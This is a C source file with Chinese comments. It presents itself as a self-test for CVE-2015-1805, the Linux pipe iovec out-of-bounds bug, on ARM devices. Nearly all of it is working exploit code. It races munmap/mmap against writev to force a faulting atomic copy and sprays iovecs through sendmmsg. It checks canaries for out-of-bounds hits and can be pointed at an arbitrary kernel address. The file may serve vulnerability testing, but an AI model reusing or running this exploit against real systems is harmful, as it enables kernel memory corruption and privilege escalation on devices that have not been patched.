/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * iov1805_test.c — CVE-2015-1805 越界自检（P3.2 v5：writev + 竞态）
 *
 * 前四版的教训（均已实测/反汇编确认）：
 *   - pipe_write 每轮 prefetch = iov_fault_in_pages_read（c0105c18），读首/末字节，
 *     会把源页读缺页进来；pipe_read 的 prefetch 是内联 strb 写 0 探测。
 *     chunk 均 <= chars <= 4096 → 至多跨 2 页 → 首尾探测必然全覆盖副本范围。
 *   - 想跨 3 页必须 chunk == 4096 == 整轮，此时 W=0，白干。
 *   - 所以确定性缺页不存在，只能让页面在 prefetch 之后、copy 之前被撤掉。
 *   - 选 pipe_write：它的 atomic 恒为 1（prefetch 返回值被丢弃），
 *     prefetch 失败照样进重试；pipe_read 的 atomic = !prefetch，
 *     prefetch 一失败就直接走非原子路径、没有重试。
 *
 * 竞态：
 *   toggler 在 CPU1 上 munmap/mmap 同一页；writer 在 CPU0 上 writev。
 *   copy 落在「已 unmap、未 map 回」的窗口 → 缺页 → in_atomic → EFAULT；
 *   重试在几微秒后 → 必须已经 map 回来 → 成功。
 *
 * 布局（8192 = 2 个 pipe buffer）：
 *   iov[0] = {p0,16}   常驻      → 整条完成，W=16
 *   iov[1] = {pR,4080} 竞态页
 *   iov[2] = {p2,4096} 常驻
 *   iov[3..256] = {NULL,0}
 *   越界 → 残留 iov[257]/[258]，目标为用户 canary
 *
 * 编译：zig cc -target arm-linux-musleabi -static -O2 -pthread -o iov1805_test iov1805_test.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <unistd.h>

#define NSEG      257
#define IOVECS    512
#define PG        4096
#define WLEN      16
#define TOTAL     8192
#define RACE_ADDR ((void *)0x60000000UL)
#define CANARY    0x5a5a5a5a5a5a5a5aULL

static struct iovec viv[IOVECS] __attribute__((aligned(64)));
static struct iovec siv[IOVECS] __attribute__((aligned(64)));
static uint64_t magic[IOVECS] __attribute__((aligned(64)));

static unsigned char *p0, *p2, *pR;
static int pfd[2];
static int udpfd = -1;
static volatile int stop;
static volatile unsigned long toggles;
static volatile int tg_ready;
static unsigned long gap_iters = 0;
static unsigned long spray_every = 1;
static unsigned long kaddr = 0;   /* !=0 时 OOB 目标换成内核地址 */

static void pin(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof(s), &s) != 0)
		perror("setaffinity");
}

static void *spin_thread(void *a)
{
	(void)a;
	volatile unsigned long x = 0;
	for (unsigned long i = 0; i < 400000000UL && !stop; i++)
		x += i;
	return NULL;
}

static unsigned long tg_mode = 0;   /* 0=mprotect 1=munmap/mmap */

static void *toggle_thread(void *a)
{
	(void)a;
	pin(1);
	tg_ready = 1;
	if (tg_mode == 2) {          /* 诊断：一次性 PROT_NONE 并保持 */
		int rc = mprotect(RACE_ADDR, PG, PROT_NONE);
		printf("[diag] mprotect(NONE) rc=%d errno=%d\n", rc, errno);
		fflush(stdout);
		tg_ready = 1;
		while (!stop)
			usleep(1000);
		return NULL;
	}
	while (!stop) {
		if (tg_mode == 3) {          /* 只 zap PTE：重试必然能重新缺页进来 */
			madvise(RACE_ADDR, PG, MADV_DONTNEED);
			toggles++;
			continue;
		}
		if (tg_mode == 0) {
			mprotect(RACE_ADDR, PG, PROT_NONE);
			for (volatile unsigned long i = 0; i < gap_iters; i++)
				;
			mprotect(RACE_ADDR, PG, PROT_READ | PROT_WRITE);
		} else {
			munmap(RACE_ADDR, PG);
			for (volatile unsigned long i = 0; i < gap_iters; i++)
				;
			if (mmap(RACE_ADDR, PG, PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
				 -1, 0) == MAP_FAILED) {
				perror("mmap race");
				break;
			}
		}
		toggles++;
	}
	return NULL;
}

static void spray(int n)
{
	struct mmsghdr m;

	memset(&m, 0, sizeof(m));
	m.msg_hdr.msg_iov = siv;
	m.msg_hdr.msg_iovlen = IOVECS;
	m.msg_hdr.msg_control = siv;
	m.msg_hdr.msg_controllen = IOVECS * sizeof(struct iovec);
	while (n-- > 0)
		syscall(SYS_sendmmsg, udpfd, &m, 1, MSG_DONTWAIT);
}

static int read_exact(int fd, unsigned char *buf, size_t n)
{
	size_t got = 0;
	int spins = 0;

	while (got < n) {
		ssize_t r = read(fd, buf + got, n - got);
		if (r > 0) {
			got += r;
			spins = 0;
		} else if (r < 0 && (errno == EAGAIN || errno == EINTR)) {
			if (++spins > 20000)
				return -1;
			usleep(1);
		} else {
			return -1;
		}
	}
	return 0;
}

static void drain(int fd)
{
	unsigned char tmp[4096];
	while (read(fd, tmp, sizeof(tmp)) > 0)
		;
}

int main(int argc, char **argv)
{
	unsigned long max_iter = 20000;
	int i, n;
	unsigned char *rbuf;
	pthread_t th[4];
	unsigned long hit = 0, full = 0, part = 0, err = 0;

	if (argc > 1)
		max_iter = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		gap_iters = strtoul(argv[2], NULL, 0);
	if (argc > 3)
		tg_mode = strtoul(argv[3], NULL, 0);
	if (argc > 4)
		spray_every = strtoul(argv[4], NULL, 0);
	if (argc > 5)
		kaddr = strtoul(argv[5], NULL, 0);
	if (!spray_every)
		spray_every = 1;

	/* 先把其它核拉上线（Exynos 5410 空闲时只留 CPU0） */
	for (i = 0; i < 3; i++)
		pthread_create(&th[i], NULL, spin_thread, NULL);
	sleep(2);

	if (pipe(pfd) != 0) {
		perror("pipe");
		return 1;
	}
	fcntl(pfd[0], F_SETFL, fcntl(pfd[0], F_GETFL) | O_NONBLOCK);

	p0 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	p2 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	rbuf = mmap(NULL, PG * 4, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	pR = mmap(RACE_ADDR, PG, PROT_READ | PROT_WRITE,
		  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p0 == MAP_FAILED || p2 == MAP_FAILED || rbuf == MAP_FAILED ||
	    pR != RACE_ADDR) {
		perror("mmap");
		return 1;
	}
	memset(p0, 0xAA, PG);
	memset(p2, 0xCC, PG);
	memset(pR, 0xDD, PG);

	for (i = 0; i < IOVECS; i++)
		magic[i] = 0xdead000000000000ULL | (uint64_t)i;

	memset(viv, 0, sizeof(viv));
	viv[0].iov_base = p0;
	viv[0].iov_len = WLEN;
	viv[1].iov_base = pR;
	viv[1].iov_len = 4080;
	viv[2].iov_base = p2;
	viv[2].iov_len = 4096;
	for (i = 257; i < IOVECS; i++) {
		viv[i].iov_base = &magic[i];
		viv[i].iov_len = 8;
	}

	memset(siv, 0, sizeof(siv));
	for (i = 257; i < IOVECS; i++) {
		siv[i].iov_base = kaddr ? (void *)kaddr : &magic[i];
		siv[i].iov_len = 8;
	}

	udpfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (udpfd < 0) {
		perror("socket");
		return 1;
	}
	{
		struct sockaddr_in sa;
		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(5105);
		sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		connect(udpfd, (struct sockaddr *)&sa, sizeof(sa));
	}

	printf("[*] control (no toggle) ...\n");
	fflush(stdout);
	spray(1);
	n = (int)writev(pfd[1], viv, NSEG);
	printf("    writev ret=%d\n", n);
	fflush(stdout);
	if (n > 0) {
		read_exact(pfd[0], rbuf, n);
		printf("[ctl] b0=%02x b16=%02x b4080=%02x b4096=%02x b8180=%02x\n",
		       rbuf[0], rbuf[16], rbuf[4080], rbuf[4096], rbuf[8180]);
		fflush(stdout);
	}
	drain(pfd[0]);

	pin(0);
	if (pthread_create(&th[3], NULL, toggle_thread, NULL) != 0) {
		perror("pthread_create");
		return 1;
	}
	while (!tg_ready)
		usleep(200);
	printf("[*] race start: max_iter=%lu gap_iters=%lu\n", max_iter, gap_iters);
	fflush(stdout);

	for (unsigned long it = 0; it < max_iter; it++) {
		ssize_t r;

		if ((it % spray_every) == 0)
			spray(1);
		r = writev(pfd[1], viv, NSEG);

		if (r > 0) {
			if (read_exact(pfd[0], rbuf, r) != 0) {
				err++;
				drain(pfd[0]);
				continue;
			}
			if (r == TOTAL) {
				uint64_t *tail = (uint64_t *)(rbuf + TOTAL - 16);
				full++;
				if (tail[0] != 0xccccccccccccccccULL && full < 5) {
					printf("[?] full tail=%016llx,%016llx (not 0xCC)\n",
					       (unsigned long long)tail[0],
					       (unsigned long long)tail[1]);
					fflush(stdout);
				}
				if (kaddr ? (tail[0] != 0xccccccccccccccccULL &&
				     tail[0] != 0) :
				    ((tail[0] >> 48) == 0xdead &&
				     (tail[1] >> 48) == 0xdead)) {
					hit++;
					if (hit <= 3) {
						printf("[+] OOB iter=%lu idx=%lu,%lu "
						       "val=%016llx,%016llx\n", it,
						       (unsigned long)(tail[0] & 0xffff),
						       (unsigned long)(tail[1] & 0xffff),
						       (unsigned long long)tail[0],
						       (unsigned long long)tail[1]);
						fflush(stdout);
					}
				}
			} else {
				part++;
			}
		} else {
			err++;
			if (err < 4) {
				printf("[?] writev=%zd errno=%d\n", r, errno);
				fflush(stdout);
			}
			drain(pfd[0]);
		}

		if ((it & 0x1ff) == 0 && it) {
			printf("[*] iter=%lu full=%lu part=%lu err=%lu hit=%lu tog=%lu\n",
			       it, full, part, err, hit, toggles);
			fflush(stdout);
		}
		if (hit >= 3)
			break;
	}

	stop = 1;
	pthread_join(th[3], NULL);
	printf("[*] done: hit=%lu full=%lu part=%lu err=%lu tog=%lu\n",
	       hit, full, part, err, toggles);
	return hit ? 0 : 2;
}
